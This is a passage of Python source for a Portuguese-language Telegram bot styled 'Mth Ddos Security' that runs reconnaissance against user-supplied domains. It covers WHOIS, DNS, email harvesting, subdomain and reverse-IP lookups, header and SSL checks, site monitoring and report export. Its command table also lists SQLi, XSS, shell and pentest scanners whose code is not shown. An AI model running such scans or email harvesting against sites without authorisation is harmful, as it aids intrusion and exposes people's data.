        send_msg(user_id, chat_id, f"✅ <b>Pentest finalizado!</b>\nTarget: {escape_html(clean_target)}\n📄 Relatório pentest enviado como arquivo .txt")
    else:
        send_msg(user_id, chat_id, f"✅ <b>Pentest finalizado!</b>\nTarget: {escape_html(clean_target)}")


def handle_osint(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: OSINT — Open Source Intelligence gathering on domain/IP"""
    log_user(user_id, username, first_name, last_name)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "🔒 <b>Acesso negado!</b> Este comando é exclusivo dos donos.")
        return
    if not args:
        # Called from menu — ask for target
        PENDING_TARGETS[user_id] = {'cmd': 'osint', 'tier': 'owner'}
        buttons = [[{"text": "❌ Cancelar", "callback_data": "menu:cancel_target"}]]
        send_message_with_buttons(chat_id,
            "🕵️ <b>Insira o alvo</b> (👑 OWNER)\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Ferramenta: <b>OSINT Intelligence</b>\n\n"
            "Envie o domínio ou IP do alvo.\n"
            "<i>Exemplo: example.com, 192.168.1.1</i>\n\n"
            "Para cancelar, pressione o botão abaixo.",
            buttons)
        return
    target = args[0]
    log_command(user_id, username, "osint", target)
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🕵️ <b>OWNER OSINT</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n🔍 Open Source Intelligence: DNS, WHOIS, emails, subdomains, tech, reverse IP...")

    url = clean_target
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    def _clean(text):
        return re.sub(r'<[^>]+>', '', text)

    sections = []
    sections.append("═" * 60)
    sections.append("  🕵️ OSINT INTELLIGENCE — OWNER MODE")
    sections.append(f"  Target: {clean_target}")
    sections.append(f"  Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    sections.append("═" * 60)

    def _get_whois_text(domain):
        """Inline WHOIS lookup"""
        text = ""
        try:
            resp = _safe_get(f"https://api.allorigins.win/raw?url=https://www.whois.com/whois/{domain}", timeout=10)
            if resp and resp.status_code == 200:
                whois_data = resp.text
                fields = {
                    'Registrar': ['Registrar:', 'Registrar Name:'],
                    'Creation Date': ['Creation Date:', 'Creation date:'],
                    'Expiry Date': ['Registry Expiry Date:', 'Expiry Date:', 'Expiration Date:'],
                    'Status': ['Domain Status:', 'Status:'],
                    'Name Server': ['Name Server:', 'Nserver:'],
                    'DNSSEC': ['DNSSEC:', 'DNSSEC:'],
                }
                for label, keys in fields.items():
                    for key in keys:
                        idx = whois_data.find(key)
                        if idx != -1:
                            val = whois_data[idx + len(key):].split('\n')[0].strip()
                            if val and len(val) < 200:
                                text += f"{label}: {val}\n"
                                break
            else:
                resp2 = _safe_get(f"http://ip-api.com/json/{domain}?fields=query,status,country,isp,org,as", timeout=5)
                if resp2 and resp2.status_code == 200:
                    data = resp2.json()
                    if data.get('status') == 'success':
                        text += f"IP: {data.get('query', 'N/D')}\n"
                        text += f"ISP: {data.get('isp', 'N/D')}\n"
                        text += f"Org: {data.get('org', 'N/D')}\n"
                        text += f"ASN: {data.get('as', 'N/D')}\n"
        except Exception as e:
            text += f"Error: {str(e)}\n"
        return text if text.strip() else "No WHOIS data available."

    # 1. WHOIS
    send_msg(user_id, chat_id, "📋 <b>1/6 — WHOIS...</b>")
    sections.append("\n1/6 — WHOIS REGISTRATION\n" + "-" * 40)
    sections.append(_clean(_get_whois_text(clean_target)))

    # 2. DNS Full
    send_msg(user_id, chat_id, "📋 <b>2/6 — DNS Intelligence...</b>")
    sections.append("\n2/6 — DNS INTELLIGENCE\n" + "-" * 40)
    sections.append(_clean(tool_dns_tools(target)))

    # 3. Emails
    send_msg(user_id, chat_id, "📋 <b>3/6 — Email Harvesting...</b>")
    sections.append("\n3/6 — EMAIL HARVESTING\n" + "-" * 40)
    sections.append(_clean(tool_email_scraper(url)))

    # 4. Subdomains
    send_msg(user_id, chat_id, "📋 <b>4/6 — Subdomain Recon...</b>")
    sections.append("\n4/6 — SUBDOMAIN RECON\n" + "-" * 40)
    sections.append(_clean(tool_subdomain_scanner(target)))

    # 5. Tech Stack
    send_msg(user_id, chat_id, "📋 <b>5/6 — Tech Stack...</b>")
    sections.append("\n5/6 — TECH STACK\n" + "-" * 40)
    sections.append(_clean(tool_tech_detect(url)))

    # 6. Reverse IP
    send_msg(user_id, chat_id, "📋 <b>6/6 — Reverse IP...</b>")
    sections.append("\n6/6 — REVERSE IP\n" + "-" * 40)
    sections.append(_clean(tool_reverse_ip(target)))

    report = "\n".join(sections)
    success = send_document(chat_id, report, f"osint_{clean_target}.txt")
    if success:
        send_msg(user_id, chat_id, f"✅ <b>OSINT finalizado!</b>\nTarget: {escape_html(clean_target)}\n📄 Relatório OSINT enviado como arquivo .txt")
    else:
        send_msg(user_id, chat_id, f"✅ <b>OSINT finalizado!</b>\nTarget: {escape_html(clean_target)}")


def handle_http(chat_id, user_id, username, first_name, last_name, args):
    """V5.1: HTTP Response Analysis — status, timing, redirects, tech headers"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /http &lt;url&gt;\nExemplo: /http google.com")
        return
    target = args[0]
    log_command(user_id, username, "http", target)
    clean_target = extract_hostname(target)
    url = clean_target
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    send_msg(user_id, chat_id, f"🔍 <b>Análise HTTP</b> em {escape_html(clean_target)}...")

    results = f"🌐 <b>Análise HTTP</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    try:
        import time as t_module
        start = t_module.time()
        resp = _safe_get(url, timeout=10, allow_redirects=True)
        elapsed = (t_module.time() - start) * 1000
        if not resp:
            results += "❌ Não foi possível acessar o site\n"
        else:
            # Status
            status_emoji = "🟢" if resp.status_code < 300 else "🟡" if resp.status_code < 400 else "🔴"
            results += f"{status_emoji} <b>Status:</b> {resp.status_code}\n"
            # Timing
            results += f"⏱️ <b>Tempo:</b> {elapsed:.0f}ms\n"
            # Content type
            ct = resp.headers.get('Content-Type', 'N/D')
            results += f"📄 <b>Content-Type:</b> {escape_html(ct[:80])}\n"
            # Server
            server = resp.headers.get('Server', 'N/D')
            results += f"🖥️ <b>Server:</b> {escape_html(server)}\n"
            # Encoding
            enc = resp.headers.get('Content-Encoding', 'N/D')
            results += f"📦 <b>Encoding:</b> {escape_html(enc)}\n"
            # Size
            size_kb = len(resp.content) / 1024
            results += f"📊 <b>Tamanho:</b> {size_kb:.1f} KB ({len(resp.content)} bytes)\n"
            # Redirect chain
            if resp.history:
                results += f"\n🔗 <b>Redirects ({len(resp.history)}):</b>\n"
                for i, h in enumerate(resp.history):
                    results += f"  → {h.status_code} {escape_html(h.url[:100])}\n"
            else:
                results += f"\n🔗 <b>Redirects:</b> Nenhum\n"
            # Key security headers
            results += f"\n🔒 <b>Security Headers:</b>\n"
            sec_headers = {
                'HSTS': 'Strict-Transport-Security',
                'X-Frame': 'X-Frame-Options',
                'X-Content': 'X-Content-Type-Options',
                'CSP': 'Content-Security-Policy',
                'Referrer': 'Referrer-Policy',
                'Permissions': 'Permissions-Policy',
            }
            for name, header in sec_headers.items():
                val = resp.headers.get(header, '')
                if val:
                    results += f"  ✅ {name}: {escape_html(val[:50])}\n"
                else:
                    results += f"  ❌ {name}: Faltando\n"
    except Exception as e:
        results += f"❌ Erro: {escape_html(str(e)[:100])}\n"

    results += "━━━━━━━━━━━━━━━━━━━━━━"
    send_msg(user_id, chat_id, results)

def handle_sslchain(chat_id, user_id, username, first_name, last_name, args):
    """V5.1: SSL Certificate Chain — full chain info with expiry dates"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /sslchain &lt;url&gt;\nExemplo: /sslchain google.com")
        return
    target = args[0]
    log_command(user_id, username, "sslchain", target)
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🔍 <b>Cadeia SSL</b> de {escape_html(clean_target)}...")

    results = f"📜 <b>Cadeia de Certificados SSL</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    try:
        import ssl
        import socket as s
        host = clean_target
        port = 443
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = s.create_connection((host, port), timeout=10)
        sock.settimeout(10)
        tls = ctx.wrap_socket(sock, server_hostname=host)

        # Get the full certificate chain
        chain = tls.getpeercert(binary_form=False)
        if chain:
            from datetime import datetime as dt
            subject = dict(x[0] for x in chain.get('subject', []))
            issuer = dict(x[0] for x in chain.get('issuer', []))
            cn = subject.get('commonName', 'N/D')
            issuer_org = issuer.get('organizationName', 'N/D')
            not_after = chain.get('notAfter', '')
            not_before = chain.get('notBefore', '')
            serial = chain.get('serialNumber', 'N/D')

            results += f"🔐 <b>Certificado do Servidor:</b>\n"
            results += f"  CN: {escape_html(cn)}\n"
            results += f"  Emissor: {escape_html(issuer_org)}\n"
            results += f"  Serial: {escape_html(serial[:40])}\n"
            if not_before:
                results += f"  Início: {escape_html(not_before)}\n"
            if not_after:
                try:
                    exp_date = dt.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                    days_left = (exp_date - dt.utcnow()).days
                    results += f"  Expira: {exp_date.strftime('%Y-%m-%d')} ({days_left} dias)\n"
                except:
                    results += f"  Expira: {escape_html(not_after)}\n"

            # SAN
            san = chain.get('subjectAltName', [])
            if san:
                dns_sans = [v for k, v in san if k == 'DNS']
                if dns_sans:
                    results += f"  SANs: {escape_html(', '.join(dns_sans[:5]))}"
                    if len(dns_sans) > 5:
                        results += f" (+{len(dns_sans)-5} mais)"
                    results += "\n"

        # TLS version
        ver = tls.version()
        results += f"\n🔒 <b>TLS:</b> {escape_html(ver or 'N/D')}\n"

        # Cipher
        cipher = tls.cipher()
        if cipher:
            results += f"🔑 <b>Cipher:</b> {escape_html(cipher[0])}\n"

        tls.close()
    except ssl.SSLError as e:
        results += f"❌ Erro SSL: {escape_html(str(e)[:150])}\n"
    except Exception as e:
        results += f"❌ Erro: {escape_html(str(e)[:150])}\n"

    results += "━━━━━━━━━━━━━━━━━━━━━━"
    send_msg(user_id, chat_id, results)

def handle_watch(chat_id, user_id, username, first_name, last_name, args):
    """V5.1: Watch a site for changes — notify when content changes
    Usage: /watch &lt;url&gt; [minutos]
    Default: check every 5 minutes
    """
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /watch &lt;url&gt; [intervalo_min]\nExemplo: /watch google.com 10\nUse /watch off para desativar.")
        return
    target = args[0]
    if target.lower() == 'off':
        try:
            with sqlite3.connect(DB_PATH) as conn:
                c = conn.cursor()
                c.execute("DELETE FROM site_monitor WHERE user_id = ? AND watch_type = 'content'", (user_id,))
                deleted = c.rowcount
                conn.commit()
            send_msg(user_id, chat_id, f"🔕 <b>Watch desativado!</b> ({deleted} monitoramentos removidos)")
        except Exception as e:
            send_msg(user_id, chat_id, f"❌ Erro: {escape_html(str(e))}")
        return

    interval = 5
    if len(args) > 1:
        try:
            interval = int(args[1])
            if interval < 1:
                interval = 1
        except ValueError:
            send_msg(user_id, chat_id, "❌ Intervalo deve ser um número válido em minutos.")
            return

    log_command(user_id, username, "watch", f"{target} {interval}min")
    clean_target = extract_hostname(target)

    # Get initial content hash
    url = clean_target
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    try:
        resp = _safe_get(url, timeout=5)
        initial_hash = hashlib.md5(resp.text.encode()).hexdigest() if resp else "offline"
    except:
        initial_hash = "offline"

    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT OR REPLACE INTO site_monitor (user_id, target, chat_id, last_status, last_check, content_hash, watch_interval, watch_type) VALUES (?, ?, ?, ?, ?, ?, ?, 'content')",
                      (user_id, clean_target, chat_id, 1, time.time(), initial_hash, interval))
            conn.commit()
        send_msg(user_id, chat_id, f"👁️ <b>Watch ativado!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n📍 {escape_html(clean_target)}\n⏱️ Check a cada {interval}min\n📊 Hash inicial: {initial_hash[:8]}...\n━━━━━━━━━━━━━━━━━━━━━━\nUse /watch off para desativar.")
    except Exception as e:
        send_msg(user_id, chat_id, f"❌ Erro: {escape_html(str(e))}")

def handle_report_url(chat_id, user_id, username, first_name, last_name, args):
    """V5.1: Generate full security report for a URL"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /report &lt;url&gt;\nExemplo: /report google.com")
        return
    target = args[0]
    log_command(user_id, username, "report", target)
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"📊 <b>Gerando relatório completo</b> para {escape_html(clean_target)}...")

    # Run all basic scanners
    info_r = tool_website_info(target)
    dns_r = tool_dns_tools(target)
    ports_r = tool_port_scanner(target)
    ssl_r = tool_ssl_audit(target)
    headers_r = tool_headers_analysis(target)
    try:
        rate_url = target
        if not rate_url.startswith(('http://', 'https://')):
            rate_url = 'http://' + rate_url
        rate_resp = _safe_get(rate_url, timeout=8)
        if rate_resp:
            rate_headers = rate_resp.headers
            rate_body = rate_resp.text.lower()
            rate_score = 100
            rate_details = []
            if not rate_headers.get('Strict-Transport-Security'):
                rate_score -= 15; rate_details.append("HSTS ausente")
            if not rate_headers.get('X-Content-Type-Options'):
                rate_score -= 10; rate_details.append("X-Content-Type-Options ausente")
            if not rate_headers.get('X-Frame-Options'):
                rate_score -= 10; rate_details.append("X-Frame-Options ausente")
            if not rate_headers.get('Content-Security-Policy'):
                rate_score -= 15; rate_details.append("CSP ausente")
            if 'wp-login.php' in rate_body or 'wp-content' in rate_body:
                rate_score -= 10; rate_details.append("WordPress detectado")
            if rate_url.startswith('http://') and not rate_url.startswith('https://'):
                rate_score -= 20; rate_details.append("Sem HTTPS")
            rate_score = max(0, min(100, rate_score))
            rate_r = f"Score: {rate_score}/100\nDetalhes: {'; '.join(rate_details[:5]) if rate_details else 'Tudo OK'}"
        else:
            rate_r = "Rate scan: Não foi possível acessar o site"
    except Exception as e:
        rate_r = f"Rate scan falhou: {str(e)}"

    # Strip HTML for report
    def clean(r):
        r = re.sub(r'<[^>]+>', '', r)
        return r[:2000]

    report = f"MTH Security — Relatório Completo\n"
    report += f"Target: {clean_target}\n"
    report += f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    report += "=" * 60 + "\n\n"
    report += "--- INFO ---\n" + clean(info_r) + "\n\n"
    report += "--- DNS ---\n" + clean(dns_r) + "\n\n"
    report += "--- PORTAS ---\n" + clean(ports_r) + "\n\n"
    report += "--- SSL ---\n" + clean(ssl_r) + "\n\n"
    report += "--- HEADERS ---\n" + clean(headers_r) + "\n\n"
    report += "--- RATE ---\n" + clean(rate_r) + "\n"

    success = send_document(chat_id, report, f"relatorio_{clean_target}.txt")
    if success:
        send_msg(user_id, chat_id, f"📄 <b>Relatório exportado!</b>\nTarget: {escape_html(clean_target)}")
    else:
        send_msg(user_id, chat_id, "❌ Falha ao enviar relatório.")
        return
# ═══════════════════════════════════════════════════════════════
#  i18n: /lang command
# ═══════════════════════════════════════════════════════════════
def handle_lang(chat_id, user_id, username, first_name, last_name, args):
    """Change bot language: /lang pt | /lang en | /lang es | /lang vi | /lang id"""
    log_user(user_id, username, first_name, last_name)
    lang_names = {'pt': 'Português', 'en': 'English', 'es': 'Español', 'vi': 'Tiếng Việt', 'id': 'Bahasa Indonesia'}
    # Translated response templates
    lang_responses = {
        'pt': {
            'current': '🌐 <b>Idioma atual:</b> {lang_name}\n\nUso: /lang &lt;idioma&gt;\n  /lang pt — Português\n  /lang en — English\n  /lang es — Español\n  /lang vi — Tiếng Việt\n  /lang id — Bahasa Indonesia',
            'invalid': '❌ Idiomas disponíveis: pt, en, es, vi, id\nUso: /lang &lt;idioma&gt;',
            'changed': '✅ <b>Idioma alterado para {lang_name}!</b>\n<i>Language changed to {lang_name}!</i>',
        },
        'en': {
            'current': '🌐 <b>Current language:</b> {lang_name}\n\nUsage: /lang &lt;language&gt;\n  /lang pt — Português\n  /lang en — English\n  /lang es — Español\n  /lang vi — Tiếng Việt\n  /lang id — Bahasa Indonesia',
            'invalid': '❌ Available languages: pt, en, es, vi, id\nUsage: /lang &lt;language&gt;',
            'changed': '✅ <b>Language changed to {lang_name}!</b>',
        },
        'es': {
            'current': '🌐 <b>Idioma actual:</b> {lang_name}\n\nUso: /lang &lt;idioma&gt;\n  /lang pt — Português\n  /lang en — English\n  /lang es — Español\n  /lang vi — Tiếng Việt\n  /lang id — Bahasa Indonesia',
            'invalid': '❌ Idiomas disponibles: pt, en, es, vi, id\nUso: /lang &lt;idioma&gt;',
            'changed': '✅ <b>¡Idioma cambiado a {lang_name}!</b>',
        },
        'vi': {
            'current': '🌐 <b>Ngôn ngữ hiện tại:</b> {lang_name}\n\nCách dùng: /lang &lt;ngôn ngữ&gt;\n  /lang pt — Português\n  /lang en — English\n  /lang es — Español\n  /lang vi — Tiếng Việt\n  /lang id — Bahasa Indonesia',
            'invalid': '❌ Ngôn ngữ có sẵn: pt, en, es, vi, id\nCách dùng: /lang &lt;ngôn ngữ&gt;',
            'changed': '✅ <b>Ngôn ngữ đã thay đổi sang {lang_name}!</b>',
        },
        'id': {
            'current': '🌐 <b>Bahasa saat ini:</b> {lang_name}\n\nPenggunaan: /lang &lt;bahasa&gt;\n  /lang pt — Português\n  /lang en — English\n  /lang es — Español\n  /lang vi — Tiếng Việt\n  /lang id — Bahasa Indonesia',
            'invalid': '❌ Bahasa tersedia: pt, en, es, vi, id\nPenggunaan: /lang &lt;bahasa&gt;',
            'changed': '✅ <b>Bahasa diubah ke {lang_name}!</b>',
        },
    }
    if not args:
        lang = get_user_lang(user_id)
        r = lang_responses.get(lang, lang_responses['pt'])
        msg = r['current'].format(lang_name=lang_names[lang])
    else:
        lang_input = args[0].lower()
        current_lang = get_user_lang(user_id)
        r = lang_responses.get(current_lang, lang_responses['pt'])
        if lang_input not in ('pt', 'en', 'es', 'vi', 'id'):
            msg = r['invalid']
        else:
            set_user_lang(user_id, lang_input)
            # Use the NEW language's response for the changed message
            new_r = lang_responses.get(lang_input, lang_responses[lang_input])
            msg = new_r['changed'].format(lang_name=lang_names[lang_input])
    send_msg(user_id, chat_id, msg)

def signal_handler(signum, frame):
    global SHUTDOWN_FLAG
    SHUTDOWN_FLAG = True
    print(f"\n🛑 Shutdown signal received (signal {signum}). Stopping gracefully...")

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# ═══════════════════════════════════════════════════════════════
#  MAIN WEBHOOK HANDLER
# ═══════════════════════════════════════════════════════════════

# Active thread count limiter
ACTIVE_THREADS = threading.Semaphore(50)  # Max 50 concurrent command threads

# PERF: Global handlers dict — no lambda creation per update
CMD_HANDLERS = {
    '/start':   lambda c, u, un, fn, ln, a: handle_start(c, u, un, fn, ln, a),
    '/help':    lambda c, u, un, fn, ln, a: handle_help(c, u, un, fn, ln, a),
    '/about':   lambda c, u, un, fn, ln, a: handle_about(c, u, un, fn, ln, a),
    '/status':  lambda c, u, un, fn, ln, a: handle_status(c, u, un, fn, ln, a),
    '/info':    lambda c, u, un, fn, ln, a: handle_info(c, u, un, fn, ln, a),
    '/sqli':    lambda c, u, un, fn, ln, a: handle_sqli(c, u, un, fn, ln, a),
    '/xss':     lambda c, u, un, fn, ln, a: handle_xss(c, u, un, fn, ln, a),
    '/admin':   lambda c, u, un, fn, ln, a: handle_admin_panel(c, u, un, fn, ln, a),
    '/ports':   lambda c, u, un, fn, ln, a: handle_ports(c, u, un, fn, ln, a),
    '/dirs':    lambda c, u, un, fn, ln, a: handle_dirs(c, u, un, fn, ln, a),
    '/sub':     lambda c, u, un, fn, ln, a: handle_sub(c, u, un, fn, ln, a),
    '/wp':      lambda c, u, un, fn, ln, a: handle_wp(c, u, un, fn, ln, a),
    '/emails':  lambda c, u, un, fn, ln, a: handle_emails(c, u, un, fn, ln, a),
    '/dns':     lambda c, u, un, fn, ln, a: handle_dns(c, u, un, fn, ln, a),
    '/cms':     lambda c, u, un, fn, ln, a: handle_cms(c, u, un, fn, ln, a),
    '/reverse': lambda c, u, un, fn, ln, a: handle_reverse(c, u, un, fn, ln, a),
    '/ftpssh':  lambda c, u, un, fn, ln, a: handle_ftpssh(c, u, un, fn, ln, a),
    '/ping':    lambda c, u, un, fn, ln, a: handle_ping(c, u, un, fn, ln, a),
    '/logs':    lambda c, u, un, fn, ln, a: handle_logs(c, u, un, fn, ln, a),
    '/panel':   lambda c, u, un, fn, ln, a: handle_panel(c, u, un, fn, ln, a),
    '/botpanel':lambda c, u, un, fn, ln, a: handle_botpanel(c, u, un, fn, ln, a),
    '/bancodds':lambda c, u, un, fn, ln, a: handle_bancodds(c, u, un, fn, ln, a),
    '/msg':     None,
    '/stats':   lambda c, u, un, fn, ln, a: handle_stats(c, u, un, fn, ln, a),
    '/ban':     lambda c, u, un, fn, ln, a: handle_ban(c, u, un, fn, ln, a),
    '/unban':   lambda c, u, un, fn, ln, a: handle_unban(c, u, un, fn, ln, a),
    '/export':  lambda c, u, un, fn, ln, a: handle_export(c, u, un, fn, ln, a),
    '/uptime':  lambda c, u, un, fn, ln, a: handle_uptime(c, u, un, fn, ln, a),
    '/listdn':  lambda c, u, un, fn, ln, a: handle_listdn(c, u, un, fn, ln, a),
    '/feedback':lambda c, u, un, fn, ln, a: handle_feedback(c, u, un, fn, ln, a),
    '/stop':    lambda c, u, un, fn, ln, a: handle_stop(c, u, un, fn, ln, a),
    '/rescan':  lambda c, u, un, fn, ln, a: handle_rescan(c, u, un, fn, ln, a),
    '/lang':    lambda c, u, un, fn, ln, a: handle_lang(c, u, un, fn, ln, a),
    # V5.0: New scanner handlers
    '/ssl':     lambda c, u, un, fn, ln, a: handle_ssl(c, u, un, fn, ln, a),
    '/headers': lambda c, u, un, fn, ln, a: handle_headers(c, u, un, fn, ln, a),
    '/cors':    lambda c, u, un, fn, ln, a: handle_cors(c, u, un, fn, ln, a),
    '/robots':  lambda c, u, un, fn, ln, a: handle_robots(c, u, un, fn, ln, a),
    '/sitemap': lambda c, u, un, fn, ln, a: handle_sitemap(c, u, un, fn, ln, a),
    '/tech':    lambda c, u, un, fn, ln, a: handle_tech(c, u, un, fn, ln, a),
    '/exposed': lambda c, u, un, fn, ln, a: handle_exposed(c, u, un, fn, ln, a),
    '/backup':  lambda c, u, un, fn, ln, a: handle_backup(c, u, un, fn, ln, a),
    '/api':     lambda c, u, un, fn, ln, a: handle_api(c, u, un, fn, ln, a),
    '/shell':   lambda c, u, un, fn, ln, a: handle_shell(c, u, un, fn, ln, a),
    '/config':  lambda c, u, un, fn, ln, a: handle_config(c, u, un, fn, ln, a),
    '/traceroute': lambda c, u, un, fn, ln, a: handle_traceroute(c, u, un, fn, ln, a),
    '/whois':   lambda c, u, un, fn, ln, a: handle_whois(c, u, un, fn, ln, a),
    '/ip':      lambda c, u, un, fn, ln, a: handle_ip(c, u, un, fn, ln, a),
    '/rate':    lambda c, u, un, fn, ln, a: handle_rate(c, u, un, fn, ln, a),
    '/compare': lambda c, u, un, fn, ln, a: handle_compare(c, u, un, fn, ln, a),
    '/history': lambda c, u, un, fn, ln, a: handle_history(c, u, un, fn, ln, a),
    '/top':     lambda c, u, un, fn, ln, a: handle_top(c, u, un, fn, ln, a),
    '/pdf':     lambda c, u, un, fn, ln, a: handle_pdf(c, u, un, fn, ln, a),
    '/schedule':lambda c, u, un, fn, ln, a: handle_schedule(c, u, un, fn, ln, a),
    # V5.0: Owner handlers
    '/maintenance': lambda c, u, un, fn, ln, a: handle_maintenance(c, u, un, fn, ln, a),
    '/cooldown':lambda c, u, un, fn, ln, a: handle_cooldown(c, u, un, fn, ln, a),
    '/vip':     lambda c, u, un, fn, ln, a: handle_vip(c, u, un, fn, ln, a),
    '/viplist':  lambda c, u, un, fn, ln, a: handle_viplist(c, u, un, fn, ln, a),
    '/log':     lambda c, u, un, fn, ln, a: handle_log(c, u, un, fn, ln, a),
    '/clearlogs': lambda c, u, un, fn, ln, a: handle_clearlogs(c, u, un, fn, ln, a),
    '/broadcast': lambda c, u, un, fn, ln, a: handle_broadcast(c, u, un, fn, ln, a),
    '/stealth': lambda c, u, un, fn, ln, a: handle_stealth(c, u, un, fn, ln, a),
    '/notify':  lambda c, u, un, fn, ln, a: handle_notify(c, u, un, fn, ln, a),
    '/bugreport': lambda c, u, un, fn, ln, a: handle_report(c, u, un, fn, ln, a),
    # V5.1: New commands
    '/scanall': lambda c, u, un, fn, ln, a: handle_scanall(c, u, un, fn, ln, a),
    '/deep':    lambda c, u, un, fn, ln, a: handle_deep(c, u, un, fn, ln, a),
    '/quick':   lambda c, u, un, fn, ln, a: handle_quick(c, u, un, fn, ln, a),
    '/cancel':  lambda c, u, un, fn, ln, a: handle_cancel(c, u, un, fn, ln, a),
    '/batch':   lambda c, u, un, fn, ln, a: handle_batch(c, u, un, fn, ln, a),
    '/http':    lambda c, u, un, fn, ln, a: handle_http(c, u, un, fn, ln, a),
    '/sslchain':lambda c, u, un, fn, ln, a: handle_sslchain(c, u, un, fn, ln, a),
    '/watch':   lambda c, u, un, fn, ln, a: handle_watch(c, u, un, fn, ln, a),
    '/report':  lambda c, u, un, fn, ln, a: handle_report_url(c, u, un, fn, ln, a),
    # Owner-exclusive commands
    '/forensic': lambda c, u, un, fn, ln, a: handle_forensic(c, u, un, fn, ln, a),
    '/pentest':  lambda c, u, un, fn, ln, a: handle_pentest(c, u, un, fn, ln, a),
    '/osint':    lambda c, u, un, fn, ln, a: handle_osint(c, u, un, fn, ln, a),
}

def process_update(update):
    """Process a Telegram update and route to the correct handler"""
    # V5.0 FIX: Handle callback_query for inline buttons (rescan)
    callback_query = update.get('callback_query')
    if callback_query:
        cb_data = callback_query.get('data', '')
        chat_id = str(callback_query['message']['chat']['id'])
        user_id = callback_query['from']['id']
        username = callback_query['from'].get('username', '')
        first_name = callback_query['from'].get('first_name', '')
        last_name = callback_query['from'].get('last_name', '')
        # V5.1 FIX: Enrich username for callback queries too
        if not username:
            username, first_name, last_name = enrich_username(user_id, username, first_name, last_name)
        if not first_name:
            first_name = username or 'User'
        cb_message_id = callback_query['message'].get('message_id')
        # i18n: detect language from callback query
        if user_id not in USER_LANG:
            detected = _LANG_MAP.get(callback_query['from'].get('language_code', ''), 'pt')
            USER_LANG[user_id] = detected

        # Acknowledge the callback to remove loading spinner
        try:
            HTTP_SESSION.post(f"{API_URL}/answerCallbackQuery", json={
                "callback_query_id": callback_query['id']
            }, timeout=5)
        except:
            pass

        # i18n: Handle language selection from inline keyboard
        if cb_data.startswith('setlang:'):
            new_lang = cb_data.split(':', 1)[1]
            if new_lang in ('pt', 'en', 'es', 'vi', 'id'):
                set_user_lang(user_id, new_lang)
                lang_names = {'pt': 'Português', 'en': 'English', 'es': 'Español', 'vi': 'Tiếng Việt', 'id': 'Bahasa Indonesia'}
                flags = {'pt': '🇧🇷', 'en': '🇺🇸', 'es': '🇪🇸', 'vi': '🇻🇳', 'id': '🇮🇩'}
                lang_texts = {
                    'pt': f"{flags[new_lang]} <b>Idioma alterado para {lang_names[new_lang]}!</b>\n\n━━━━━━━━━━━━━━━━━━━━━━\n<i>Mth Ddos Security v5.2</i>",
                    'en': f"{flags[new_lang]} <b>Language changed to {lang_names[new_lang]}!</b>\n\n━━━━━━━━━━━━━━━━━━━━━━\n<i>Mth Ddos Security v5.2</i>",
                    'es': f"{flags[new_lang]} <b>¡Idioma cambiado a {lang_names[new_lang]}!</b>\n\n━━━━━━━━━━━━━━━━━━━━━━\n<i>Mth Ddos Security v5.2</i>",
                    'vi': f"{flags[new_lang]} <b>Ngôn ngữ đã thay đổi sang {lang_names[new_lang]}!</b>\n\n━━━━━━━━━━━━━━━━━━━━━━\n<i>Mth Ddos Security v5.2</i>",
                    'id': f"{flags[new_lang]} <b>Bahasa diubah ke {lang_names[new_lang]}!</b>\n\n━━━━━━━━━━━━━━━━━━━━━━\n<i>Mth Ddos Security v5.2</i>",
                }
                try:
                    HTTP_SESSION.post(f"{API_URL}/editMessageText", json={
                        "chat_id": chat_id,
                        "message_id": cb_message_id,
                        "text": lang_texts.get(new_lang, lang_texts['pt']),
                        "parse_mode": "HTML",
                        "disable_web_page_preview": True
                    }, timeout=5)
                except:
                    pass
            return

        # Handle /help and /about from inline buttons
        if cb_data == 'cmd:help':
            handle_help(chat_id, user_id, username, first_name, last_name)
            return
        if cb_data == 'cmd:about':
            handle_about(chat_id, user_id, username, first_name, last_name)
            return

        # Parse callback data: "rescan:sqli:example.com" or "rescan:sqli:example.com/1"
        if cb_data.startswith('rescan:'):
            parts = cb_data.split(':', 2)
            if len(parts) >= 3:
                scan_cmd = parts[1]
                target = parts[2]
                # Route to handle_rescan with parsed args
                handle_rescan(chat_id, user_id, username, first_name, last_name, [scan_cmd, target])
                # Edit the original message to show rescan is happening
                try:
                    HTTP_SESSION.post(f"{API_URL}/editMessageText", json={
                        "chat_id": chat_id,
                        "message_id": cb_message_id,
                        "text": f"🔄 <b>Rescan:</b> /{scan_cmd} {escape_html(target)}...\n<i>Processando...</i>",
                        "parse_mode": "HTML",
                        "disable_web_page_preview": True
                    }, timeout=5)
                except:
                    pass
            return

        # Tier selection callback: "tier:sqli:vip:example.com"
        # ═══════════════════════════════════════════════════════════
        #  MENU SYSTEM CALLBACKS v5.2
        # ═══════════════════════════════════════════════════════════
        
        # Main menu pages
        if cb_data == 'menu:back':
            show_main_menu(chat_id, user_id, username, first_name)
            return
        
        if cb_data == 'menu:vulns':
            show_menu_vulns(chat_id, user_id)
            return
        
        if cb_data == 'menu:recon':
            show_menu_recon(chat_id, user_id)
            return
        
        if cb_data == 'menu:audit':
